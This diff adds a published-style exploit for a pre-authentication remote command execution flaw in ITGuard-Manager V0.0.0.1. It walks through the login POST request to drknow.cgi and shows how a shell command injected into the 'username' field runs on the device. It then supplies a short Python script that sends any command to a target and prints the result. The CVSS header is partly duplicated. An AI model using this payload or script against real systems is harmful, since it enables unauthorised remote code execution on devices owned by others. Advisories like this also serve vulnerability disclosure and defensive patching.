@@ -1,0 +1,49 @@
+# Vulnerability Title:  ITGuard-Manager V0.0.0.1 PreAuth Remote Code Execution 
+# Author: Nassim Asrir 
+# Contact: wassline@gmail.com / @asrir_nassim
+# CVE: Waiting ...
+# CVSS: CVSS:3.0/AV:P/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:H/E:H/MAV:P3.0/AV:P/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:H/E:H/MAV:P  
+# Vendor:  http://www.innotube.com
+
+
+Details:
+========
+
+First we need to know what happens when we need to LogIn.
+When the User or Attacker insert any strings in the login form he/she will get this POST request: 
+
+POST /cgi-bin/drknow.cgi?req=login HTTP/1.1 
+Host: server
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Referer: http://server/log-in.html?lang=KOR
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 45
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+req=login&lang=KOR&username=admin&password=admin
+
+ 
+Ok now we have this POST request and all we care about is the ‘username’ parameter . and we
+can execute our system commands via this parameter due to missing input sanitization.
+The payload will be: 'admin|'command'||x we will change the command by any *unix command (ls – id – mkdir ….) 
+
+Exploit:
+=======
+
+#i am not responsible for any wrong use.
+
+import requests
+target = raw_input('Target(With proto) : ')
+command = raw_input('Command To Execute : ')
+fullpath=target +"/cgi-bin/drknow.cgi?req=login"
+data = {'req':'login',
+        'lang':'ENG',
+        'username':'admin|'+command+'||x',
+        'password':'admin'}
+ 
+execute = requests.post(fullpath, data = data)
+ 
+print execute.text
